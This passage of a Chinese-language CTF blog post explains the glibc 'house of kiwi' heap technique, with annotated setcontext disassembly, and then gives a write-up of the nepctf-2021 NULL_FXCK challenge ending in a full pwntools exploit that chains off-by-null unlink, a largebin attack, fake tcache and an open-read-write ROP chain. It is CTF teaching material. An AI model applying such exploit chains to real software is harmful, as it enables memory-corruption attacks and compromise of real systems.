class="hljs-number">0F</span>FFFFFFFFFFFF001h<br>.text:<span class="hljs-number">0000000000053057</span>                 jnb     loc_5317F<br>.text:<span class="hljs-number">000000000005305</span>D                 mov     rcx, [rdx+<span class="hljs-number">0E0</span>h]<br>.text:<span class="hljs-number">0000000000053064</span>                 fldenv  byte ptr [rcx]<br>.text:<span class="hljs-number">0000000000053066</span>                 ldmxcsr dword ptr [rdx+<span class="hljs-number">1</span>C0h]<br>.text:<span class="hljs-number">000000000005306</span>D                 mov     rsp, [rdx+<span class="hljs-number">0</span>A0h]          <span class="hljs-comment">//这里将rdx+0xa0的值赋值给了rsp，也就是我们控制了rdx就控制了rsp</span><br>.text:<span class="hljs-number">0000000000053074</span>                 mov     rbx, [rdx+<span class="hljs-number">80</span>h]<br>.text:<span class="hljs-number">000000000005307B</span>                 mov     rbp, [rdx+<span class="hljs-number">78</span>h]<br>.text:<span class="hljs-number">000000000005307F</span>                 mov     r12, [rdx+<span class="hljs-number">48</span>h]<br>.text:<span class="hljs-number">0000000000053083</span>                 mov     r13, [rdx+<span class="hljs-number">50</span>h]<br>.text:<span class="hljs-number">0000000000053087</span>                 mov     r14, [rdx+<span class="hljs-number">58</span>h]<br>.text:<span class="hljs-number">000000000005308B</span>                 mov     r15, [rdx+<span class="hljs-number">60</span>h]<br>.text:<span class="hljs-number">000000000005308F</span>                 test    dword ptr fs:<span class="hljs-number">48</span>h, <span class="hljs-number">2</span><br>.text:<span class="hljs-number">000000000005309B</span>                 jz      loc_53156<br>.text:<span class="hljs-number">00000000000530</span>A1                 mov     rsi, [rdx+<span class="hljs-number">3</span>A8h]<br>.text:<span class="hljs-number">00000000000530</span>A8                 mov     rdi, rsi<br>.text:<span class="hljs-number">00000000000530</span>AB                 mov     rcx, [rdx+<span class="hljs-number">3B</span>0h]<br>.text:<span class="hljs-number">00000000000530B</span>2                 cmp     rcx, fs:<span class="hljs-number">78</span>h<br>.text:<span class="hljs-number">00000000000530B</span>B                 jz      <span class="hljs-type">short</span> loc_530F5<br>.text:<span class="hljs-number">00000000000530B</span>D<br>.text:<span class="hljs-number">00000000000530B</span>D loc_530BD:                              ; CODE XREF: setcontext+<span class="hljs-number">9</span>E↓j<br>.text:<span class="hljs-number">00000000000530B</span>D                 mov     rax, [rsi<span class="hljs-number">-8</span>]<br>.text:<span class="hljs-number">00000000000530</span>C1                 and     rax, <span class="hljs-number">0F</span>FFFFFFFFFFFFFF8h<br>.text:<span class="hljs-number">00000000000530</span>C5                 cmp     rax, rsi<br>.text:<span class="hljs-number">00000000000530</span>C8                 jz      <span class="hljs-type">short</span> loc_530D0<br>.text:<span class="hljs-number">00000000000530</span>CA                 sub     rsi, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">00000000000530</span>CE                 jmp     <span class="hljs-type">short</span> loc_530BD<br>.text:<span class="hljs-number">00000000000530</span>D0 ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000000530</span>D0<br>.text:<span class="hljs-number">00000000000530</span>D0 loc_530D0:                              ; CODE XREF: setcontext+<span class="hljs-number">98</span>↑j<br>.text:<span class="hljs-number">00000000000530</span>D0                 mov     rax, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">00000000000530</span>D7                 incsspq rax<br>.text:<span class="hljs-number">00000000000530</span>DC                 rstorssp qword ptr [rsi<span class="hljs-number">-8</span>]<br>.text:<span class="hljs-number">00000000000530E1</span>                 saveprevssp<br>.text:<span class="hljs-number">00000000000530E5</span>                 mov     rax, [rdx+<span class="hljs-number">3B</span>0h]<br>.text:<span class="hljs-number">00000000000530</span>EC                 mov     fs:<span class="hljs-number">78</span>h, rax<br>.text:<span class="hljs-number">00000000000530F</span>5<br>.text:<span class="hljs-number">00000000000530F</span>5 loc_530F5:                              ; CODE XREF: setcontext+<span class="hljs-number">8B</span>↑j<br>.text:<span class="hljs-number">00000000000530F</span>5                 rdsspq  rcx<br>.text:<span class="hljs-number">00000000000530F</span>A                 sub     rcx, rdi<br>.text:<span class="hljs-number">00000000000530F</span>D                 jz      <span class="hljs-type">short</span> loc_5311C<br>.text:<span class="hljs-number">00000000000530F</span>F                 neg     rcx<br>.text:<span class="hljs-number">0000000000053102</span>                 shr     rcx, <span class="hljs-number">3</span><br>.text:<span class="hljs-number">0000000000053106</span>                 mov     esi, <span class="hljs-number">0F</span>Fh<br>.text:<span class="hljs-number">000000000005310B</span><br>.text:<span class="hljs-number">000000000005310B</span> loc_5310B:                              ; CODE XREF: setcontext+EA↓j<br>.text:<span class="hljs-number">000000000005310B</span>                 cmp     rcx, rsi<br>.text:<span class="hljs-number">000000000005310</span>E                 cmovb   rsi, rcx<br>.text:<span class="hljs-number">0000000000053112</span>                 incsspq rsi<br>.text:<span class="hljs-number">0000000000053117</span>                 sub     rcx, rsi<br>.text:<span class="hljs-number">000000000005311</span>A                 ja      <span class="hljs-type">short</span> loc_5310B<br>.text:<span class="hljs-number">000000000005311</span>C<br>.text:<span class="hljs-number">000000000005311</span>C loc_5311C:                              ; CODE XREF: setcontext+CD↑j<br>.text:<span class="hljs-number">000000000005311</span>C                 mov     rsi, [rdx+<span class="hljs-number">70</span>h]<br>.text:<span class="hljs-number">0000000000053120</span>                 mov     rdi, [rdx+<span class="hljs-number">68</span>h]<br>.text:<span class="hljs-number">0000000000053124</span>                 mov     rcx, [rdx+<span class="hljs-number">98</span>h]<br>.text:<span class="hljs-number">000000000005312B</span>                 mov     r8, [rdx+<span class="hljs-number">28</span>h]<br>.text:<span class="hljs-number">000000000005312F</span>                 mov     r9, [rdx+<span class="hljs-number">30</span>h]<br>.text:<span class="hljs-number">0000000000053133</span>                 mov     r10, [rdx+<span class="hljs-number">0</span>A8h]<br>.text:<span class="hljs-number">000000000005313</span>A                 mov     rdx, [rdx+<span class="hljs-number">88</span>h]<br>.text:<span class="hljs-number">0000000000053141</span>                 rdsspq  rax<br>.text:<span class="hljs-number">0000000000053146</span>                 cmp     r10, [rax]<br>.text:<span class="hljs-number">0000000000053149</span>                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">000000000005314</span>E                 jnz     <span class="hljs-type">short</span> loc_53153<br>.text:<span class="hljs-number">0000000000053150</span>                 push    r10<br>.text:<span class="hljs-number">0000000000053152</span>                 retn<br>.text:<span class="hljs-number">0000000000053153</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000053153</span><br>.text:<span class="hljs-number">0000000000053153</span> loc_53153:                              ; CODE XREF: setcontext+<span class="hljs-number">11</span>E↑j<br>.text:<span class="hljs-number">0000000000053153</span>                 jmp     r10<br>.text:<span class="hljs-number">0000000000053156</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000053156</span><br>.text:<span class="hljs-number">0000000000053156</span> loc_53156:                              ; CODE XREF: setcontext+<span class="hljs-number">6B</span>↑j<br>.text:<span class="hljs-number">0000000000053156</span>                 mov     rcx, [rdx+<span class="hljs-number">0</span>A8h]  <span class="hljs-comment">//也可以控制到rcx</span><br>.text:<span class="hljs-number">000000000005315</span>D                 push    rcx               <span class="hljs-comment">//控制到rip</span><br>.text:<span class="hljs-number">000000000005315</span>E                 mov     rsi, [rdx+<span class="hljs-number">70</span>h]<br>.text:<span class="hljs-number">0000000000053162</span>                 mov     rdi, [rdx+<span class="hljs-number">68</span>h]<br>.text:<span class="hljs-number">0000000000053166</span>                 mov     rcx, [rdx+<span class="hljs-number">98</span>h]<br>.text:<span class="hljs-number">000000000005316</span>D                 mov     r8, [rdx+<span class="hljs-number">28</span>h]<br>.text:<span class="hljs-number">0000000000053171</span>                 mov     r9, [rdx+<span class="hljs-number">30</span>h]<br>.text:<span class="hljs-number">0000000000053175</span>                 mov     rdx, [rdx+<span class="hljs-number">88</span>h]<br>.text:<span class="hljs-number">0000000000053175</span> ; &#125; <span class="hljs-comment">// starts at 53030</span><br>.text:<span class="hljs-number">000000000005317</span>C ; __unwind &#123;<br>.text:<span class="hljs-number">000000000005317</span>C                 xor     eax, eax<br>.text:<span class="hljs-number">000000000005317</span>E                 retn<br></code></pre></td></tr></table></figure><p> <strong>也就是说控制到rdx + 0xa0 和rdx + 0xa8的位置就可以实现栈迁移，那么就要搞清楚，调用这个指针的时候，rdx是什么,那么就需要调试一下</strong></p><p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910135459034-1831903992.png" alt="img"></strong></p><p><strong>调用了fflush</strong></p><p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910135916067-1174633673.png" alt="img"></strong></p><p><strong>这里sync指针已经被我修改变成了setcontext+61的地址</strong></p><p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910140002274-1838616609.png" alt="img"></strong></p><p><strong>而此时的rdx是 IO_helper_jumps的地址</strong></p><p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910140201072-1884939081.png" alt="img"></strong></p><p><strong>那么劫持到 IO_helper_jumps + 0xa0即可劫持程序流</strong></p><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a><strong>小结：</strong></h3><p><strong>想要达到house_of_kiwi需要至少两次任意地址改，修改sync指针，以及*<em>IO_helper_jumps +0xa0和0xa8的位置，然后就可以劫持到程序流了，对于2.27以上堆题目来说可以通过劫持tcache bin 结构体来达到任意地址分配，进而达到目的。*</em></strong></p><p><strong>相比较其他的house_of系列kiwi要求的条件也比较苛刻，但是它的利用手法并不难，在能满足这个条件的情况下，这种手法还是非常不错的。</strong></p><h2 id="例题：nepctf-2021-NULL-FXCK"><a href="#例题：nepctf-2021-NULL-FXCK" class="headerlink" title="例题：nepctf-2021 NULL_FXCK"></a><strong>例题：nepctf-2021 NULL_FXCK</strong></h2><p><strong>题目链接：<a href="https://pan.baidu.com/s/134UgXo_mBGyXGfRzjzUfUQ?pwd=k5h6">题目</a><br>提取码：k5h6</strong></p><p><strong>ida逆向分析</strong></p><p><strong>add函数规定了申请chunk有大小的限制，最小0x100，最大0x2000</strong></p><p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910194908326-132930920.png" alt="img"></strong></p><p><strong>edit函数存在off_by_null漏洞，但是只能使用一次</strong></p><p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910194842502-1275553514.png" alt="img"></strong></p><p><strong>show函数存在截断</strong></p><p><strong>free函数没有UAF漏洞</strong></p><p><strong>分析：只有一个off_by_null漏洞，只能使用一次，那么可以通过unlink实现堆块重叠，达到泄露地址的目的，但是本题libc是2.32的libc，还是存在_malloc_hook这些钩子，但是这些被ban掉了，而且开了沙箱保护，我们只能orw读取flag，那么就可以从上面house_of_kiwi下手。首先要做的是unlink，但是这样就需要伪造fd指针和bk指针，以前我们一般是将fd和bk指针指向自身来绕过unlink检查，但是现在我们不能泄露地址，也就是要在无法泄露地址的情况下完成unlink</strong></p><p><strong>那么我们可以申请6个堆块，free 0，3，5堆块，那么堆块3的fd和bk就已经确定了，此时想要达到堆块重叠，可以把chunk3的size改大（改到top_chunk这样下次在top_chunk申请堆块时候，free时候，会向上合并），怎么来呢，free掉chunk2，然后chunk2和chunk3会合并，然后申请堆块修改chunk3的size，那么此时，链表就被破坏了</strong></p><p><strong>free 0，3，5</strong></p><p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202520917-1426703431.png" alt="img"></strong></p><p><strong>chunk2和chunk3合并</strong></p><p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202555232-2002728228.png" alt="img"></strong></p><p><strong>chunk3size被修改，同时它的fd和bk指针已经设置好了</strong></p><p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202629686-588878874.png" alt="img"></strong></p><p><strong>此时，剩下两个chunk加入到了largebin中，我们申请出来，但是怎么修改它们的fd和bk指针呢</strong></p><p><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202658837-1880588532.png" alt="img"></p><p><strong>注意看刚刚chunk3和chunk2合并之后剩下的chunk（称为left_chunk），它的地址只有最低位和chunk3不一样，而且chunk3的地址末位是0，这个是一开始布局的时候这样布置的，因为add有截断，我们可以通过free这个left_chunk和chunk0以前和chunk5来构成链子，最后通过add截断修改掉fd或者bk指针</strong></p><p><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202923078-1143309769.png" alt="img"></p><p><strong>这里以chunk0为例子，注意他的fd是chunk3+0x20的位置，那么如果截断一下就是chunk3了</strong></p><p><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910203743142-1403970523.png" alt="img"></p><p><strong>同理chunk5也是一样，那么完成这个再伪造一下prev_size即可完成unlink，即可申请堆块达到堆块重叠，泄露地址，但是存在00截断，还需要加入到largebin中泄露libc地址以及heap地址</strong></p><p><strong>那么现在泄露地址的问题解决了，还需要实现任意地址写，那么这里涉及一个知识，我们知道管理tcachebin链表是一个结构体在heap起始处</strong></p><p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910204311146-480753226.png" alt="img"></strong></p><p><strong>其实这个在tls里面有一个指针指向它只是被映射成了这个地址，我们可以找一下</strong></p><p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910204526845-1874284413.png" alt="img"></strong></p><p><strong>那么通过largebin 劫持这个地址即可劫持到tcachebin链表实现任意地址写，接下来就是house_of_kiwi，实现栈迁移，提前把orw链子写入到chunk里面</strong></p><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a><strong>EXP：</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br><br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.32.so&quot;</span>)<br><br>io = process(<span class="hljs-string">&quot;./NULL_FXCK&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,msg=<span class="hljs-string">&#x27;\x00&#x27;</span></span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;(: Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    io.sendafter(<span class="hljs-string">&quot;(: Content: &quot;</span>,msg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    io.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,msg)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment">#6</span><br><br><br>free(<span class="hljs-number">0</span>)   <br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">5</span>)<br>gdb.attach(io)<br>free(<span class="hljs-number">2</span>) <span class="hljs-comment">#chunk3 chunk2 he bing</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x428</span> + p64(<span class="hljs-number">0xc91</span>)<br>add(<span class="hljs-number">0x440</span>,payload) <span class="hljs-comment">#0</span><br><span class="hljs-comment">#gdb.attach(io)</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#2 chunk3 chunk2 leave part</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#3  yuanxian chunk0</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment">#5 yuanxian chunk5</span><br><br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>add(<span class="hljs-number">0x418</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">9</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#3</span><br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">0x9f8</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x428</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#5</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span> + p64(<span class="hljs-number">0xc90</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>,payload)<br><span class="hljs-comment">#gdb.attach(io)</span><br>add(<span class="hljs-number">0x418</span>)<br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment"># fangzhi top_chunk</span><br><br>free(<span class="hljs-number">3</span>)<br>payload = p64(<span class="hljs-number">0</span>) *<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x421</span>)<br>add(<span class="hljs-number">0x430</span>,payload)<br>add(<span class="hljs-number">0x1600</span>)<br>show(<span class="hljs-number">4</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x6a0</span> -libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br>show(<span class="hljs-number">5</span>)<br>heap_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x2b0</span><br>suc(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><span class="hljs-comment">#gdb.attach(io)</span><br>tls_truct = libc_base + <span class="hljs-number">0x1eb578</span><br>suc(<span class="hljs-string">&quot;tls_truct&quot;</span>,tls_truct)<br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&quot;open&quot;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&quot;read&quot;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&quot;write&quot;</span>]<br>setcontext  = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>]<br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002858f</span><span class="hljs-comment">#: pop rdi; ret; </span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002ac3f</span><span class="hljs-comment">#: pop rsi; ret;</span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x0000000000114161</span><span class="hljs-comment">#: pop rdx; pop r12; ret;</span><br>IO_file_jumps = libc_base + <span class="hljs-number">0x1e54c0</span><br>IO_hleper_jumps = libc_base + <span class="hljs-number">0x1e48c0</span><br>suc(<span class="hljs-string">&quot;IO_hleper_jumps&quot;</span>,IO_hleper_jumps)<br>ret = libc_base + <span class="hljs-number">0x0000000000026699</span> <span class="hljs-comment">#: ret; </span><br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x208</span> + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x428</span> + p64(<span class="hljs-number">0x211</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(<span class="hljs-number">0xa01</span>)<br>add(<span class="hljs-number">0x1240</span>,payload)<br><br>free(<span class="hljs-number">0</span>) <span class="hljs-comment"># orw_addr</span><br>flag_addr = heap_base + <span class="hljs-number">0x8e0</span> + <span class="hljs-number">0x100</span><br>orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>orw += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr + <span class="hljs-number">0x100</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">0x40</span>)*<span class="hljs-number">2</span> + p64(read)<br>orw += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr + <span class="hljs-number">0x100</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">0x40</span>)*<span class="hljs-number">2</span> + p64(write)<br>orw = orw.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>orw += <span class="hljs-string">b&#x27;flag\x00\x00\x00\x00&#x27;</span><br><br>add(<span class="hljs-number">0x440</span>,orw) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#11</span><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment">#12</span><br><br>free(<span class="hljs-number">5</span>) <span class="hljs-comment">#unlink big  chunk</span><br>free(<span class="hljs-number">4</span>) <span class="hljs-comment"># large_bin attack chunk </span><br><span class="hljs-comment"># chunk5 ----&gt; largebin</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(<span class="hljs-number">0x431</span>) + p64(libc_base + <span class="hljs-number">0x1e3ff0</span>)*<span class="hljs-number">2</span> + p64(heap_base + <span class="hljs-number">0x1350</span>)<br>payload += p64(tls_truct - <span class="hljs-number">0x20</span>)<br><br>add(<span class="hljs-number">0x1240</span>,payload)<br>free(<span class="hljs-number">11</span>)<br>add(<span class="hljs-number">0x500</span>) <span class="hljs-comment"># wancheng large_bin attack</span><br><br>add(<span class="hljs-number">0x410</span>) <span class="hljs-comment">#11</span><br>free(<span class="hljs-number">4</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(<span class="hljs-number">0x431</span>) + p64(libc_base + <span class="hljs-number">0x1e3ff0</span>)*<span class="hljs-number">2</span> + p64(heap_base + <span class="hljs-number">0x1350</span>)*<span class="hljs-number">2</span><br>add(<span class="hljs-number">0x1240</span>,payload)<br><br>fake_tcache = <span class="hljs-string">b&#x27;\x07\x00&#x27;</span> * <span class="hljs-number">0x35</span><br>fake_tcache = fake_tcache.ljust(<span class="hljs-number">0xe8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(IO_file_jumps + <span class="hljs-number">0x60</span>)<br>fake_tcache = fake_tcache.ljust(<span class="hljs-number">0x168</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(IO_hleper_jumps + <span class="hljs-number">0xa0</span>)<br>fake_tcache +=  p64(heap_base + <span class="hljs-number">0x46f0</span>) <span class="hljs-comment">#top_chunk</span><br>add(<span class="hljs-number">0x420</span>,fake_tcache)<br>add(<span class="hljs-number">0x100</span>,p64(setcontext+<span class="hljs-number">61</span>))<br>add(<span class="hljs-number">0x200</span>,p64(heap_base + <span class="hljs-number">0x8e0</span>)+p64(ret))<br>add(<span class="hljs-number">0x210</span>,p64(<span class="hljs-number">0x999</span>))<br>gdb.attach(io)<br>add(<span class="hljs-number">0x1000</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="最后效果"><a href="#最后效果" class="headerlink" title="最后效果"></a><strong>最后效果</strong></h3><p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910204909438-688353297.png" alt="img"></strong></p><p><strong>The best way to predict the future is to create it.</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSS小记1</title>
    <link href="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/"/>
    <url>/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/</url>
    
